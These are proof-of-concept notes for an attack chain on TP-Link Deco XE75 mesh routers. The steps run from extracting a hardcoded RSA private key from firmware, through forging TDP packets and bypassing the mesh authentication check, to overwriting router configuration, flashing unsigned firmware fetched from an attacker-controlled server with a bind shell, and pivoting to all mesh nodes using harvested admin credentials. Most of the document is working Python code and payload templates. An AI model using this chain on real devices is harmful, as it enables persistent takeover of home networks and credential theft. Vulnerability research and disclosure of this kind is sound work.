# PoC Notes - TP-Link Deco XE75 Hardcoded Mesh Group Key → Full Mesh RCE

## Vulnerability Class
Pre-auth Hardcoded RSA-512 Private Key → Post-auth Config Overwrite / Unsigned Firmware Flash / Mesh Pivot

## Affected Products
TP-Link Deco XE75 / XE5300 / WE10800 (same firmware image / same group-info)

## Transport
UDP 20002 (TDP) / TCP 20002 (TMP)

---

## Step 1: Key Extraction

### Target partition
```
fw_data/user_data/group-info  (UBI partition 27, type=USER_DATA)
```

### Extract from firmware image
```bash
# After binwalk / ubireader extraction:
cat squashfs-root/fw_data/user_data/group-info
# → {"role":"AP","key":"AAAAB3NzaC1yc2E...","gid":"70303de6-63d9-11e8-a3f6-0000eb367511"}
```

### Decode RSA key components
```python
import base64, struct

b64 = "AAAAB3NzaC1yc2EAAAADAQABAAAAQQC/q1ssRADI..."  # full value from group-info
raw = base64.b64decode(b64)

def read_mpint(data, offset):
    length = struct.unpack(">I", data[offset:offset+4])[0]
    return data[offset+4:offset+4+length], offset+4+length

# Parse Dropbear wire format: type | e | n | d | p | q
offset = 0
ktype_len = struct.unpack(">I", raw[0:4])[0]
ktype = raw[4:4+ktype_len]          # b"ssh-rsa"
offset = 4 + ktype_len
e, offset = read_mpint(raw, offset)  # public exponent = 65537
n, offset = read_mpint(raw, offset)  # 512-bit modulus
d, offset = read_mpint(raw, offset)  # PRIVATE EXPONENT — present in firmware
p, offset = read_mpint(raw, offset)  # prime p
q, offset = read_mpint(raw, offset)  # prime q

print(f"n={n.hex()}")  # 64 bytes
print(f"d={d.hex()}")  # 64 bytes — private key
```

### Verification Goal
- Confirm all private key components (n, e, d, p, q) extractable from firmware image
- Confirm `gid` is static across firmware versions of same model

---

## Step 2: TDP Packet Forge

### TDP packet structure (from tmpsvr FUN_00111b50)
```
offset 0x00: uint8  version  = 0x02
offset 0x01: uint8  reserved = 0x00
offset 0x02: uint16 opcode   = <target opcode>
offset 0x04: uint32 length   = <payload length>
offset 0x08: uint32 crc32    = 0x00000000  (zero before compute)
offset 0x0C: uint8  payload[...]
```

### CRC32 computation (no secret key)
```python
import binascii, struct

def forge_tdp(opcode, payload):
    header = struct.pack(">BBH I I",
        0x02, 0x00,       # version, reserved
        opcode,           # target opcode
        len(payload),     # length
        0x5a6b7c8d        # CRC32 field replaced with this constant before compute
    )
    pkt = header + payload
    crc = binascii.crc32(pkt) & 0xFFFFFFFF
    # Write actual CRC into bytes 8-11
    return pkt[:8] + struct.pack(">I", crc) + pkt[12:]
```

### Send to target
```python
import socket
pkt = forge_tdp(opcode=0xC404, payload=b"<subconfig_payload>")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(pkt, ("192.168.68.1", 20002))
```

### Verification Goal
- Confirm tmpsvr accepts forged packet (no drop at CRC check)
- Confirm packet reaches tmp-luci dispatcher (observe /proc/<pid> for tmp-luci fork)

---

## Step 3: sync_slave_check Bypass

### Auth gate (discover.lua offset 12755)
```
recv TDP → read_group_info() → compute group_hid (CRC32 of group fields)
         → decrypt_table(challenge, group_private_key)
         → compare group_id with "70303de6-63d9-11e8-a3f6-0000eb367511"
         → compare config_version
         → PASS → proceed to opcode handler
```

### Bypass with extracted key
```python
from Crypto.PublicKey import RSA

# Reconstruct RSA key from extracted d, n, e, p, q
n_int = int.from_bytes(n, 'big')
e_int = int.from_bytes(e, 'big')
d_int = int.from_bytes(d, 'big')
p_int = int.from_bytes(p, 'big')
q_int = int.from_bytes(q, 'big')

key = RSA.construct((n_int, e_int, d_int, p_int, q_int))

# decrypt_table: RSA private decrypt of challenge from target device
def decrypt_table(ciphertext_bytes):
    c = int.from_bytes(ciphertext_bytes, 'big')
    m = pow(c, d_int, n_int)
    return m.to_bytes(64, 'big')

# encrypt_table: RSA public encrypt (for response)
def encrypt_table(plaintext_bytes):
    m = int.from_bytes(plaintext_bytes, 'big')
    c = pow(m, e_int, n_int)
    return c.to_bytes(64, 'big')
```

### Verification Goal
- Extract challenge from SYNC_DETECT_SLAVE TMP handshake
- Compute decrypt_table response using extracted d
- Confirm target device proceeds past "group id mismatched" check

---

## Step 4: Config Overwrite (inspect_and_save_subconfig)

### Opcode
`0xC404` (or adjacent c4xx — registered in op_manager.lua constant table)

### Payload structure
```json
{
  "params": {
    "change": ["firewall", "system"],
    "dev_id": "<target_device_id>",
    "config_version": <version_int>
  },
  "data": {
    "firewall": "<uci_config_content>",
    "system": "<uci_config_content>"
  }
}
```

### Expected execution on target
```
inspect_and_save_subconfig
  → md5sum /etc/config/* > /tmp/uci_comp_config/uci_show_info_before
  → write attacker config
  → diff
  → uci_apply      ← writes /etc/config/*
  → reload_user_config
```

### Verification Goal
- Confirm /etc/config/firewall modified with attacker-supplied content after opcode delivery
- Confirm service reload triggered (e.g., dnsmasq restart observable via logs)
- Confirm no secondary authentication gate between TDP receipt and uci_apply

---

## Step 5: Unsigned Firmware Flash (SYNC_FIRMWARE + SYNC_UPGRADE)

### Attacker-controlled fields in SYNC_FIRMWARE
```json
{
  "params": {
    "host": "<attacker_http_server_ip>",
    "filename": "<firmware_name>",
    "checksum": "<attacker_computed_md5>",
    "type": "normal"
  }
}
```

### Target behavior
```
sync-server receives SYNC_FIRMWARE
  → downloads firmware from host (attacker-controlled IP)
  → stores at /var/firmwares/<filename>
  → verifies md5sum == checksum   ← attacker provides matching checksum
  → NO signature/RSA verification
SYNC_UPGRADE → flashes /var/firmwares/<filename>
```

### What to Check
- No `verify_signature` / `rsa_verify` / `openssl verify` call in sync-server binary or sync.lua
- sync-server strings: `SYNC_FIRMWARE`, `SYNC_UPGRADE` present — no adjacent verify strings
- firmware script (lib/sync-server/scripts/firmware): only md5sum check, no signing
- Confirm /var/firmwares/ populated with attacker binary after SYNC_FIRMWARE delivery

### Verification Goal
- Deliver modified firmware image (e.g., add a bind shell to /etc/rc.local)
- Confirm SYNC_UPGRADE triggers flash of modified image
- Confirm persistent access after reboot

---

## Step 6: Mesh Pivot via forward_tmp_request

### Opcode
`0xC40B` (c40b–c40f range in op_manager.lua)

### Payload
```json
{
  "opcode": "0xC404",
  "target_id": "<RE_device_id>",
  "params": "<attacker_config_payload>",
  "data": "<arbitrary>"
}
```

### Target behavior
```
forward_tmp_request
  → write JSON → /tmp/sync-server/forward_tmp_request-<pid>
  → ubus call sync request
  → /lib/sync-server/scripts/request infile outfile 0xC404 <RE_ip> 1
      → uci_r:get_profile("accountmgnt", "username/password")
      → tmpcli connects to RE with router admin credentials
      → sends opcode 0xC404 + attacker payload to RE
```

### Verification Goal
- Confirm /tmp/sync-server/forward_tmp_request-<pid> written with attacker JSON
- Confirm RE receives and processes forwarded opcode (observe RE config change)
- Confirm router's accountmgnt credentials used for RE authentication (no additional auth)
- Enumerate all REs via fetch_subconfig (reads /tmp/sync-server/mesh_dev_list), then pivot

---

## Summary: Full Attack Chain

```
1. Extract RSA-512 private key from group-info partition (offline, from firmware image)
2. Forge TDP packet (CRC32 recompute — no secret key needed)
3. Pass sync_slave_check (decrypt group challenge with extracted private key)
4. Deliver SYNC_FIRMWARE pointing to attacker HTTP server → target fetches evil.bin
5. Deliver SYNC_UPGRADE → target flashes evil.bin (no signature check)
6. From owned AP: forward_tmp_request → pivot to all RE nodes with router admin creds
```

## Key Indicators
- `group-info` partition extractable from firmware: same key/gid across all units of same model
- `opcode_whitelist` absent in `/etc/config/firewall` — no opcode filtering
- `sync-server` binary: no RSA verify / openssl calls adjacent to SYNC_FIRMWARE handler
- `lib/sync-server/scripts/firmware`: md5sum only, no signature step
- `lib/sync-server/scripts/request`: plaintext admin credential extraction from UCI
